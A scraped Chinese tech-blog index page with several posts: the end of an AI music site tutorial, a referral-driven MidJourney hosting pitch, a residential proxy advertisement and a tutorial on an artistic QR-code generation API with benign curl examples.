                      </figure> 打开浏览器，访问 <a href="http://localhost:8080（Vue">http://localhost:8080（Vue</a> CLI 默认端口），你将看到一个简单的界面，输入一个提示词并点击“Generate Music”按钮，即可生成音乐。</li>
                  </ol>
                  <p><img src="https://cdn.acedata.cloud/s662pt.png" alt=""></p>
                  <p>默认会生成两首音乐，有 MP3 和 MP4 视频，点击即可播放 AI 生成的音乐。</p>
                  <p><img src="https://cdn.acedata.cloud/q3zbct.png" alt=""></p>
                  <p>点击以下音频或视频链接试听：</p>
                  <audio id="myAudio" controls>
                    <source src="https://cdn1.suno.ai/ab8dcd9b-3527-46da-b0c7-4d1a78b51846.mp3" type="audio/mpeg"> 您的浏览器不支持 audio 元素。
                  </audio>
                  <button onclick="playPause()">播放/暂停</button>
                  <script>
                    var myAudio = document.getElementById("myAudio");

                    function playPause()
                    {
                      if (myAudio.paused)
                      {
                        myAudio.play();
                      }
                      else
                      {
                        myAudio.pause();
                      }
                    }

                  </script>
                  <video id="myVideo" width="320" height="240" controls>
                    <source src="https://cdn1.suno.ai/3cbd5b7b-7354-48a3-8158-9cd87e1b116b.mp4" type="video/mp4"> 您的浏览器不支持 video 元素。
                  </video>
                  <button onclick="playPause()">播放/暂停</button>
                  <script>
                    var myVideo = document.getElementById("myVideo");

                    function playPause()
                    {
                      if (myVideo.paused)
                      {
                        myVideo.play();
                      }
                      else
                      {
                        myVideo.pause();
                      }
                    }

                  </script>
                  <p><a href="https://cdn1.suno.ai/ab8dcd9b-3527-46da-b0c7-4d1a78b51846.mp3" target="_blank" rel="noopener">MP3试听 https://cdn1.suno.ai/ab8dcd9b-3527-46da-b0c7-4d1a78b51846.mp3</a></p>
                  <p><a href="https://cdn1.suno.ai/3cbd5b7b-7354-48a3-8158-9cd87e1b116b.mp4" target="_blank" rel="noopener">MP4试看 https://cdn1.suno.ai/3cbd5b7b-7354-48a3-8158-9cd87e1b116b.mp4</a></p>
                  <h2 id="四、结语"><a href="#四、结语" class="headerlink" title="四、结语"></a>四、结语</h2>
                  <p>通过这种方式，我们成功地将前端和后端代码分离，清晰地组织在不同的目录下，同时也实现了跨域请求。希望这个项目能给你带来启发，并帮助你更好地理解和实现类似的项目。</p>
                  <p>这样我们就搭建好了一个本地的 AI 音乐生成平台，如果你愿意，可以将代码打包后上传到服务器，再绑定一个域名，就可以提供给其他小伙伴一起来使用了。</p>
                  <p>通过 Vue 和 Node.js，以及 Acedata 提供的 Suno AI 音乐 API 的强大功能，我们在短短的时间内成功搭建了一个AI音乐生成网站。这个过程不仅展示了人工智能技术在音乐创作中的威力，也向我们展示了如何利用现有的技术来创造出令人惊叹的新体验。希望这个项目能够激发你的创造灵感，并让你更加深入地探索人工智能与音乐的奇妙结合！</p>
                  <p>在线体验站点：</p>
                  <p><a href="http://suno.morecale.com莫卡乐AI音乐" target="_blank" rel="noopener">http://suno.morecale.com莫卡乐AI音乐</a> </p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-05-27 18:50:22" itemprop="dateCreated datePublished" datetime="2024-05-27T18:50:22+08:00">2024-05-27</time>
                </span>
                <span id="/42344.html" class="post-meta-item leancloud_visitors" data-flag-title="五分钟搭建自己的AI音乐站点率" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>9.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42350.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 人工智能 <i class="label-arrow"></i>
                  </a>
                  <a href="/42350.html" class="post-title-link" itemprop="url">搭建一个自己的 MidJourney 平台：开启你的赚钱之旅</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>在当今数字化时代，越来越多的人开始寻找在线赚钱的机会。无论你是一个技术爱好者，还是一个创业新手，搭建 MidJourney 并将其转化为一个盈利项目，都是一个绝佳的选择。本文将带你了解如何零代码搭建一个 MidJourney 绘画平台，并通过这个项目实现盈利。</p>
                  <h2 id="什么是-MidJourney？"><a href="#什么是-MidJourney？" class="headerlink" title="什么是 MidJourney？"></a>什么是 MidJourney？</h2>
                  <p>MidJourney 是一个创新的绘画平台，懂的人自然懂，我就不作更多的介绍了，下面直接上干货。</p>
                  <h2 id="搭建的是一个什么样的平台？"><a href="#搭建的是一个什么样的平台？" class="headerlink" title="搭建的是一个什么样的平台？"></a>搭建的是一个什么样的平台？</h2>
                  <p><img src="https://cdn.acedata.cloud/v4o2ul.png" alt=""></p>
                  <p><strong>国内可用</strong>：一个无需科学上网，即可在国内正常使用的 MidJourney 平台。</p>
                  <h2 id="如何搭建这样的一个平台？"><a href="#如何搭建这样的一个平台？" class="headerlink" title="如何搭建这样的一个平台？"></a>如何搭建这样的一个平台？</h2>
                  <p><strong>下载代码</strong>：在 github 上下载 Nexior 开源代码，地址如下：<a href="https://github.com/acedatacloud" target="_blank" rel="noopener">https://github.com/acedatacloud</a> 。<br>如果你不方便访问，可以到官网 <a href="https://platform.acedata.cloud/?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">https://platform.acedata.cloud/?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f</a> 联系客服即可。</p>
                  <p><strong>注册域名</strong>：如果你只是需要自己用，可以不用注册域名，如果你想通过搭建的平台赚钱，那就得注册一个域名。方法很简单，直接搜索一下注册域名，按照网上的教程 30 分钟就可以搞定。</p>
                  <p><strong>一台服务器</strong>：同样的，如果只是需要自己用，可不需要服务器，如果想要通过自己的网站赚钱，你还得准备一台 linux 服务器，刚起步，也不要太好的服务器，一年 100 元左右的就可以了，腾讯云阿里云都可，不过建议选择香港的服务器。</p>
                  <h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2>
                  <p><strong>上传代码</strong>：将下载下来的 Nexior 压缩包上传到 服务器上并解压。修改 src 目录下 config.ts 里的邀请码为自己的邀请码。</p>
                  <p><img src="https://cdn.acedata.cloud/vim3t5.png" alt=""></p>
                  <p>邀请码如何获得？这个就是我们可以赚钱的核心了，直接点击下面的链接注册即可。 <a href="https://platform.acedata.cloud/?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">https://platform.acedata.cloud/?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f</a></p>
                  <p><strong>生成镜像</strong>：在当前目录下执行终端命令：</p>
                  <pre><code> docker build -t morecale .
</code></pre>
                  <p>morecale 这个名称你可自己随意取一个其它的即可。</p>
                  <p><strong>创建容器</strong>：创建一个容器，按照如下提示操作：</p>
                  <p><img src="https://cdn.acedata.cloud/3y31ll.png" alt=""></p>
                  <p><strong>创建网站</strong>：创建一个静态网页，并设置好域名与反向代理即可，然后在上面申请好免费的 SSL 证书。</p>
                  <p><img src="https://cdn.acedata.cloud/nigksm.png" alt=""></p>
                  <h2 id="成功案例分享"><a href="#成功案例分享" class="headerlink" title="成功案例分享"></a>成功案例分享</h2>
                  <p>为了激励你，我分享一些朋友搭建的网站案例：</p>
                  <ul>
                    <li><strong>莫卡乐 AI 助手</strong></li>
                  </ul>
                  <p>莫卡乐通过 Nexior 搭建的一个 Midjourney 平台，从最开始搭建的供自己使用到推荐给朋友们使用，不到三个月，已获收益近 2000 元了，虽然不多，但不需要如何打理即可躺赚，想想也是挺开心的一件事。</p>
                  <p><img src="https://cdn.acedata.cloud/lvbru3.png" alt=""></p>
                  <ul>
                    <li><strong>小智 AI</strong></li>
                  </ul>
                  <p>小智 AI 也是网友通过 Nexior 搭建的一个 AI 平台。并且还创建了多个在线课程，吸引了大量学员，每月收入稳定增长。</p>
                  <h2 id="分销比例"><a href="#分销比例" class="headerlink" title="分销比例"></a>分销比例</h2>
                  <p><strong>提高比例</strong>：从上图中你可能看到了，最开始的分销比例不是很高？哈哈，我告诉你一个小窍门，你添加底部的业务微信，可以与他申请，调高你的分销分成比例呢，我就是与他联系后，直接提到了 17% 的，当然，你能提高到多少，就看你的运气了。</p>
                  <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2>
                  <p>搭建 MidJourney 并通过这个项目赚钱，不仅可以实现个人收入的增长，还能帮助你在数字化时代实现自我价值。立即行动，开启你的 MidJourney 赚钱之旅吧！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-05-22 05:24:30" itemprop="dateCreated datePublished" datetime="2024-05-22T05:24:30+08:00">2024-05-22</time>
                </span>
                <span id="/42350.html" class="post-meta-item leancloud_visitors" data-flag-title="搭建一个自己的 MidJourney 平台：开启你的赚钱之旅" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42343.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/42343.html" class="post-title-link" itemprop="url">分享一个好用的住宅IP</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>随着互联网的普及和发展，海外住宅IP的需求日益增加。个人用户可以通过使用海外住宅 IP 来访问特定地区的新闻、娱乐、教育和文化资源，从而获得更高的访问速度、优质的用户体验和更强的网络安全性。</p>
                  <p>对于企业而言，海外住宅IP为进军国际市场提供了重要的支持。通过了解目标市场的需求和竞争环境，企业可以制定相应的营销策略和产品定位。海外住宅 IP 还有助于企业进行市场推广活动，实现定向投放广告和提供个性化的客户体验，从而提升品牌知名度和市场份额。</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-11-28-150620.png" alt=""></p>
                  <h2 id="一、海外住宅-IP-的可靠性"><a href="#一、海外住宅-IP-的可靠性" class="headerlink" title="一、海外住宅 IP 的可靠性"></a>一、海外住宅 IP 的可靠性</h2>
                  <p>海外住宅 IP 的可靠性主要取决于供应商的信誉和服务质量。为了保障用户的在线安全和隐私，选择一个可靠的海外住宅 IP 提供商至关重要。在此推荐 SmartProxy，一家优质海外住宅代理和全球IP资源服务商。SmartProxy 提供稳定可靠的服务，而且价格相对较为实惠。注册即领免费流量：</p>
                  <h2 id="二、选择SmartProxy的理由"><a href="#二、选择SmartProxy的理由" class="headerlink" title="二、选择SmartProxy的理由"></a>二、选择SmartProxy的理由</h2>
                  <p>• 提供200+国家和地区的真实家庭住宅IP，汇聚优质IP资源池。</p>
                  <p>• 提供纯净高匿代理，无限带宽，确保网络数据采集不受封锁。</p>
                  <p>• 价格实惠，支持HTTP/HTTPS/SOCKS5协议，可根据业务需求定制独享IP。</p>
                  <p>• 支持自定义国家、IP时效和城市，精准定位，提供更快更稳定的连接。</p>
                  <p>• 提供全天候实时支持，专业团队随时提供帮助和支持。</p>
                  <p>除了海外住宅 IP 业务，SmartProxy 还提供静态住宅 IP 服务，这种 IP 地址是固定不变的，适用于需要长期稳定连接的应用场景。</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-11-28-150720.png" alt=""></p>
                  <p>SmartProxy 的海外代理适用于爬虫采集、市场调查、品牌保护、广告验证、社交媒体、海外电商运营、FB/TK/PayPal 养号等各种应用场景。SmartProxy 已为众多知名网站和企业提供服务，支持 API 批量使用和多线程超高并发。</p>
                  <p>请点击以下链接进行免费测试👉: <a href="https://www.smartproxy.cn/?keyword=jingmi" target="_blank" rel="noopener">smartproxy 住宅 IP</a>，我们的客服团队将 24/7 在线解答您的问题，欢迎随时联系我们。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2023-11-26 09:17:06" itemprop="dateCreated datePublished" datetime="2023-11-26T09:17:06+08:00">2023-11-26</time>
                </span>
                <span id="/42343.html" class="post-meta-item leancloud_visitors" data-flag-title="分享一个好用的住宅IP" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>782</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42342.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Other <i class="label-arrow"></i>
                  </a>
                  <a href="/42342.html" class="post-title-link" itemprop="url">艺术二维码 API 申请及使用</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>艺术二维码是一种创新的技术产品，它将二维码与美观的背景图像相结合，创造出既实用又美观的作品。它们不仅具有传统二维码的功能性，能被智能设备快速扫描识别，还加入了艺术元素，增强了视觉吸引力和品牌识别度。其中，部分艺术二维码甚至由人工智能生成，充分利用了现代技术，展示出无与伦比的创新和独特性。这使得艺术二维码在品牌营销、广告推广等领域有着广泛的应用。</p>
                  <p>简单来说，艺术二维码是扫描二维码与艺术美感的完美结合，它不仅提供了信息传递的功能，同时也能提升用户的视觉体验，使得每一次的扫描都充满艺术的享受。</p>
                  <h2 id="作品概览"><a href="#作品概览" class="headerlink" title="作品概览"></a>作品概览</h2>
                  <p>我们先来看几个二维码作品：</p>
                  <p><img src="https://cdn.cuiqingcai.com/l4z26c.png" alt=""></p>
                  <p>怎么样？这些二维码就是艺术二维码，它实现了图片和二维码的完美结合，比普通的二维码更加具有艺术感。而且关键是，每一个二维码都能扫描！</p>
                  <h2 id="怎样制作？"><a href="#怎样制作？" class="headerlink" title="怎样制作？"></a>怎样制作？</h2>
                  <p>想制作这样的二维码吗？怎么来制作这样的艺术二维码呢？</p>
                  <p>其实这个从技术来讲是相对复杂的。在现在这个 AI 时代，目前艺术二维码的解决方案是基于 Stable Diffusion 来做的，通过输入 prompt 我们可以生成对应的图片，同时结合一些二维码内容的融合最终实现这样的效果。</p>
                  <p>所以这里面其实最主要的挑战在于：如何既把二维码做得好看而且富有艺术，而且二维码还能被正确扫描。说实话这个技术其实还是蛮难的，需要大量的参数调整才能做到稍微好点的效果。</p>
                  <p>应该 99% 的人在第一步就放弃了。</p>
                  <p>假设通过不断的调整，我们真的做出来了这样的效果，真正运行起来也是一个不小的开销，如果要速度比较快的话，可能得性能比较好的 GPU，可能一不小心就上万块钱了。</p>
                  <p>有朋友可能会说：我不想费那么多精力，我也不想花那么多钱，我就想做个艺术二维码，或者我想把这个能力集成到我的产品里面，要是有这样现成的 API 就好了。</p>
                  <p>有吗？还真有。</p>
                  <p>这里推荐一个知数云平台，知数云平台提供了艺术二维码相关生成 API，我们可以调用 API 输入各种参数，比如图片内容、二维码链接、样式风格等等各种参数，就可以非常方便地生成想要的艺术二维码了，而且首次申请免费赠送 20 张绘制次数。</p>
                  <h2 id="申请-API"><a href="#申请-API" class="headerlink" title="申请 API"></a>申请 API</h2>
                  <p>知数云平台是什么呢？简单来说，它是一个提供多样数字化 API 的服务平台，其官网链接是：<a href="https://data.zhishuyun.com。" target="_blank" rel="noopener">https://data.zhishuyun.com。</a></p>
                  <p>要使用艺术二维码 API，首先可以到<a href="https://data.zhishuyun.com/documents/ee085d2a-a0b9-4f0e-8b4d-8da407345138" target="_blank" rel="noopener" title="艺术二维码 API ">艺术二维码 API </a>页面点击「获取」按钮：</p>
                  <p><img src="https://cdn.cuiqingcai.com/5m5ps3.png" alt=""></p>
                  <p>如果你尚未登录，会自动跳转到登录页面，扫码关注公众号即可自动登录，无需额外注册步骤。</p>
                  <p>登录完了之后会跳回原页面，此时会提示「您尚未申请该服务，需要申请」。</p>
                  <p>申请时会校验实名认证情况，请按照网站提示完成实名认证。实名认证会校验姓名、手机号、身份证号，需要三者一致才可以通过认证。认证完了之后可以返回页面，刷新一下页面确保信息更新，然后重新申请即可通过申请。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>要使用艺术二维码的最基本的功能，需要填入如下几个必须参数：</p>
                  <ul>
                    <li>type：二维码的类型，如纯文本、链接等。</li>
                    <li>content：二维码的内容，比如如果是链接的话，我们可以填入对应的链接。</li>
                    <li>prompt：二维码对应的风格绘制指令，强烈建议用英文。比如说 <code>pizza</code> 则会绘制一个像披萨的二维码。</li>
                  </ul>
                  <p>接下来，我们来生成一个知数云官网的二维码，类型是链接，内容是 <a href="https://data.zhishuyun.com" target="_blank" rel="noopener" title="https://data.zhishuyun.com">https://data.zhishuyun.com</a>，prompt 这里填写如下内容：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">(best quality, <span class="attr">masterpiece</span>:<span class="number">1.2</span>), underwater, ((pirate ship)), close up, zoom <span class="keyword">in</span>, absurdes, big waves, twister, water falling, tentacles, ((glowing lights)), ((lighting storm)), fog, smoke, <span class="number">4</span>k res, <span class="number">8</span>k, higly detailed textures, cinematic shot, intricate details, side view</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在测试页面填写如下内容：</p>
                  <p><img src="https://cdn.cuiqingcai.com/sskdbl.png" alt=""></p>
                  <p>然后点击测试：</p>
                  <p><img src="https://cdn.cuiqingcai.com/u3aw1e.png" alt=""></p>
                  <p>过一会就发现艺术二维码就生成了，结果类似如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"task_id"</span>: <span class="string">"a7e8831c-203d-447e-83fc-71783c766446"</span>,</span><br><span class="line">  <span class="string">"image_url"</span>: <span class="string">"https://qrart.cdn.zhishuyun.com/attachments/1132182283529494652/1136344944630563006/Germey_2023-08-02__64ca8da51e5834b500e077bf.png"</span>,</span><br><span class="line">  <span class="string">"image_width"</span>: <span class="number">768</span>,</span><br><span class="line">  <span class="string">"image_height"</span>: <span class="number">768</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>二维码如下：</p>
                  <p><img src="https://cdn.cuiqingcai.com/2lpfjj.png" alt=""></p>
                  <p>这样我们就生成了一个二维码，主体是一个船只，悬挂着几个旗帜，而这些旗帜恰恰构成了二维码的定位点。</p>
                  <p>用手机扫描一下，就可以跳转到知数云的官网了。</p>
                  <p>同时上述内容调用方案我们可以非常方便地转成 API 调用。</p>
                  <h2 id="prompt-指南"><a href="#prompt-指南" class="headerlink" title="prompt 指南"></a>prompt 指南</h2>
                  <p>通过上述操作可以看到，艺术二维码关键在于 prompt 的编写，那 prompt 的编写都有什么讲究呢？</p>
                  <p>其实这个都是通用的 Stable Diffusion 的 prompt 指令，艺术二维码就是基于 Stable Diffusion 技术加上一些特殊调优生成的，所以它的输入 prompt 和 Stable Diffusion 是完全一样的。</p>
                  <p>如果你还不知道什么是 Stable Diffusion，可以到它的官网了解下：<a href="https://stablediffusionweb.com/" target="_blank" rel="noopener" title="https://stablediffusionweb.com/">https://stablediffusionweb.com/</a>，还有 prompt 教程和指南：<a href="https://stable-diffusion-art.com/prompt-guide/" target="_blank" rel="noopener" title="https://stable-diffusion-art.com/prompt-guide/">https://stable-diffusion-art.com/prompt-guide/</a>，另外 Stable Diffusion 还制作了 prompt 生成器，可以帮助我们生成 prompt：<a href="https://stablediffusionweb.com/prompt-generator" target="_blank" rel="noopener" title="https://stablediffusionweb.com/prompt-generator">https://stablediffusionweb.com/prompt-generator</a>，除此之外还有一些 prompt 样例集合网站：<a href="https://publicprompts.art/" target="_blank" rel="noopener" title="https://publicprompts.art/">https://publicprompts.art/</a></p>
                  <p>如上内容仅作参考，如果更多，可以自行搜索 Stable Diffusion 相关的资料进行学习。</p>
                  <h2 id="高级参数"><a href="#高级参数" class="headerlink" title="高级参数"></a>高级参数</h2>
                  <p>本 API 还提供了更多高级参数方便进行更多功能定制，说明如下：</p>
                  <ul>
                    <li>pattern：预设二维码组合。预设二维码风格组合，如定位框的样式（方形、圆形等）、点的样式（方形、圆形等）。</li>
                    <li>preset：预设背景风格。二维码背景的风格，如超现实风格、霓虹效果、手绘风格等。</li>
                    <li>steps：绘制迭代次数。当次数越大，绘制的二维码艺术风格越强，范围为 10-20，默认是 16。</li>
                    <li>qrw：二维码的权重。当权重越大，图片越接近真实二维码，但是艺术化的风格会减弱，取值范围是 1.5-3，默认是 1.5。</li>
                    <li>seed：随机种子。用于生成随机二维码，当种子相同时，生成的二维码风格是一样的，范围为 1-9007199254740991。</li>
                    <li>rawurl：是否保持原始链接。默认情况下会将输入链接缩短为短链接，可以提高扫码率，该值默认为 false。</li>
                    <li>padding_level：二维码内边距。二维码内边距的大小，</li>
                    <li>aspect_ratio：二维码宽高比。</li>
                    <li>position：二维码位置。</li>
                    <li>pixel_style：二维码像素风格。</li>
                    <li>marker_shape：二维码定位框形状。</li>
                    <li>sub_marker：二维码子标记样式。</li>
                    <li>rotate：二维码旋转角度。</li>
                    <li>ecl：二维码纠错等级。</li>
                    <li>padding_noise：二维码内边距噪点。</li>
                  </ul>
                  <p>下文我们来详细了解下艺术二维码 API 的一些高级参数，选取其中一些进行介绍。</p>
                  <blockquote>
                    <p>注意：API 可能在不断迭代，下文内容仅供参考，最新 API 使用方式请参见知数云官方文档：<a href="https://data.zhishuyun.com/documents/821cfbbf-6b97-4c42-b21f-e29fdd245a96" target="_blank" rel="noopener">https://data.zhishuyun.com/documents/821cfbbf-6b97-4c42-b21f-e29fdd245a96</a></p>
                  </blockquote>
                  <h2 id="预设-preset"><a href="#预设-preset" class="headerlink" title="预设 preset"></a>预设 preset</h2>
                  <p>艺术二维码 API 设置了很多预设模板，这个参数叫做 preset，取值如下：</p>
                  <ul>
                    <li>sunset（日落）: 融合了夕阳余晖的温暖色调和柔和光线效果。</li>
                    <li>floral（花卉）: 带有花朵和植物元素的艺术风格，强调自然之美。</li>
                    <li>snowflakes（雪花）: 冰雪世界，具有冰晶和雪花的冷酷氛围。</li>
                    <li>feathers（羽毛）: 呈现出羽毛和鸟类特征，营造轻盈和柔软的感觉。</li>
                    <li>raindrops（雨滴）: 以雨滴和水珠为灵感，创造出清新湿润的效果。</li>
                    <li>ultra-realism（超现实）: 极度逼真的细节和质感，营造出超越现实的效果。</li>
                    <li>epic-realms（史诗领域）: 壮丽的场景和史诗感，带来宏大的视觉体验。</li>
                    <li>intricate-studio（错综复杂）: 富有细节和复杂性，需要仔细观察才能完全理解的风格。</li>
                    <li>symmetric-masterpiece（对称杰作）: 通过对称元素创造出精美的平衡和谐。</li>
                    <li>luminous-highway（发光高速公路）: 强调夜间的发光效果，如车灯和霓虹灯。</li>
                    <li>celestial-journey（星际之旅）: 探索宇宙和星际的奇幻旅程。</li>
                    <li>neon-mech（霓虹机械）: 结合了霓虹灯和机械元素，营造出未来感。</li>
                    <li>ethereal-low-poly（飘渺低多边形）: 低多边形风格，创造出虚幻和抽象的效果。</li>
                    <li>golden-vista（金色景观）: 以金色调为主，呈现出壮观的视觉景象。</li>
                    <li>cinematic-expanse（电影式广袤）: 带有电影感的广阔场景，引人入胜。</li>
                    <li>cinematic-warm（电影式温暖）: 具有电影质感的温暖色调和光线效果。</li>
                    <li>desolate-wilderness（荒凉荒野）: 描绘荒芜和荒野，营造出孤寂感。</li>
                    <li>vibrant-palette（鲜明调色板）: 色彩丰富多样，强烈的色彩对比。</li>
                    <li>enigmatic-journey（神秘之旅）: 探索充满谜团和神秘感的旅程。</li>
                    <li>timeless-cinematic（永恒电影）: 具有电影质感且不受时间限制的风格。</li>
                    <li>regal-galaxy（皇家星系）: 带有皇家气息的星系和宇宙元素。</li>
                    <li>illustrious-canvas（杰出画布）: 创作出卓越而引人注目的画布效果。</li>
                    <li>expressive-mural（富有表现力的壁画）: 充满表现力和情感的大型壁画风格。</li>
                    <li>serene-haze（宁静薄雾）: 带有宁静和薄雾效果，营造出宁静的氛围。</li>
                  </ul>
                  <p>我们下面来尝试下不同参数的效果，比如拿 raindrops（雨滴）和 raindrops（金色景观）为例来看下效果。</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">"https://api.zhishuyun.com/qrart/generate?token=&#123;token&#125;"</span> \</span><br><span class="line">  -H <span class="string">"accept: application/json"</span> \</span><br><span class="line">  -H <span class="string">"content-type: application/json"</span> \</span><br><span class="line">  -d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "type": "link",</span></span><br><span class="line"><span class="string">    "content": "https://data.zhishuyun.com",</span></span><br><span class="line"><span class="string">    "prompt": "sakura",</span></span><br><span class="line"><span class="string">    "preset": "sunset"</span></span><br><span class="line"><span class="string">  &#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们把 preset 设置为了日落效果，效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-24-170652.png" alt=""></p>
                  <p>如果我们换个风格，比如把 preset 参数换成 expressive-mural（富有表现力的壁画），效果如下：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-24-170648.png" alt=""></p>
                  <p>关于其他的一些设定大家可以自行试验。</p>
